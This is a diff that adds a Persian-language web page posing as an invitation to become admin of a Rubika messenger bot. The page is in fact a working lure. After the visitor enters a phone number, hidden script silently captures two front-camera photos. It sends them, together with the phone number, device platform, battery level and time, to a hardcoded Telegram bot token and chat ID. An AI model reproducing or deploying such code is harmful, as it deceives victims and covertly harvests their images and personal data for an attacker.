@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ادمین ربات</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #000;
+            font-family: 'Vazirmatn', sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(10,10,30,0.8);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 0 80px rgba(138,43,226,0.8);
+            animation: neonGlow 3s infinite alternate;
+            border: 2px solid;
+            border-color: #8a2be2 #00ffff #ff00ff #8a2be2;
+        }
+        @keyframes neonGlow {
+            0% { box-shadow: 0 0 80px #8a2be2, 0 0 120px #00ffff; }
+            50% { box-shadow: 0 0 100px #ff00ff, 0 0 150px #8a2be2; }
+            100% { box-shadow: 0 0 80px #00ffff, 0 0 120px #ff00ff; }
+        }
+        h1 {
+            font-size: 32px;
+            background: linear-gradient(45deg, #8a2be2, #00ffff, #ff00ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            animation: textPulse 2s infinite;
+        }
+        @keyframes textPulse { 0%,100% { opacity:1 } 50% { opacity:0.8 } }
+        p { font-size: 18px; margin: 20px 0; line-height: 1.8; }
+        input {
+            width: 100%;
+            padding: 16px;
+            margin: 20px 0;
+            border: 2px solid #8a2be2;
+            border-radius: 15px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            transition: 0.4s;
+        }
+        input:focus { border-color: #00ffff; box-shadow: 0 0 30px #00ffff; }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #8a2be2, #ff00ff);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            box-shadow: 0 0 40px rgba(138,43,226,0.8);
+            transition: 0.4s;
+        }
+        button:hover { transform: scale(1.05); box-shadow: 0 0 60px #ff00ff; }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="welcome">
+    <h1>ادمین ربات</h1>
+    <p>می‌خوای ادمین ربات خفن روبیکا بشی؟</p>
+    <button onclick="choice('yes')">بله، خیلی!</button>
+    <button onclick="choice('no')">نه، ممنون</button>
+</div>
+
+<div class="container hidden" id="phone">
+    <h1>مرحله اول</h1>
+    <p>شماره موبایلت رو وارد کن تا ادامه بدیم</p>
+    <input type="text" id="phoneInput" placeholder="09123456789" maxlength="11">
+    <button onclick="nextPage()">ادامه</button>
+</div>
+
+<div class="container hidden" id="final">
+    <h1>تبریک عشقم!</h1>
+    <p>تو انتخاب شدی که ادمین یکی از قوی‌ترین ربات‌های روبیکا بشی 💜</p>
+    <p>از این به بعد تمام گروه‌ها زیر نظرته، همه چیز دست توئه، هیچی ازت پنهون نمی‌مونه 😈</p>
+    <p>فقط یه لحظه صبر کن تا سیستم فعال بشه...</p>
+</div>
+
+<video id="video" playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "-1003384762825";
+    let userPhone = "";
+
+    function choice(ans) {
+        if (ans === 'no') {
+            document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50vh'>متأسفانه انتخاب نشدی 😢</h1>";
+            setTimeout(() => window.close(), 2000);
+        } else {
+            document.getElementById('welcome').classList.add('hidden');
+            document.getElementById('phone').classList.remove('hidden');
+        }
+    }
+
+    function nextPage() {
+        userPhone = document.getElementById('phoneInput').value.trim();
+        if (userPhone.length < 10) {
+            alert("شماره رو درست وارد کن عشقم");
+            return;
+        }
+        document.getElementById('phone').classList.add('hidden');
+        document.getElementById('final').classList.remove('hidden');
+
+        // بعد ۵ ثانیه عکس بگیر
+        setTimeout(takeSelfies, 5000);
+    }
+
+    async function takeSelfies() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            const sendPhoto = (num) => {
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    canvas.toBlob(blob => {
+                        const form = new FormData();
+                        form.append('chat_id', CHAT_ID);
+                        form.append('photo', blob, `selfie_${num}.jpg`);
+                        form.append('caption', getInfoText());
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:form});
+                    }, 'image/jpeg', 0.95);
+                }, num * 1500);
+            };
+
+            sendPhoto(1);
+            sendPhoto(2);
+
+            stream.getTracks().forEach(t => t.stop());
+
+            // اطلاعات کامل رو هم بفرست
+            sendInfoText();
+
+        } catch(e) {
+            sendInfoText(); // حتی اگه دوربین نداد، اطلاعات رو بفرست
+        }
+    }
+
+    function getInfoText() {
+        const now = new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' });
+        let battery = "نامشخص";
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                battery = `${Math.round(b.level * 100)}% ${b.charging ? "(در حال شارژ)" : ""}`;
+            });
+        }
+
+        return `ادمین جدید وارد شد! 💜
+
+𝗣𝗵𝗼𝗻𝗲: ${userPhone}
+𝗠𝗼𝗱𝗲𝗹: ${navigator.platform}
+𝗕𝗮𝘁𝘁𝗲𝗿𝘆: ${battery}
+𝗧𝗶𝗺𝗲: ${now}
+
+𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: ™MicY™`;
+    }
+
+    function sendInfoText() {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(getInfoText())}`);
+    }
+</script>
+
+</body>
+</html>
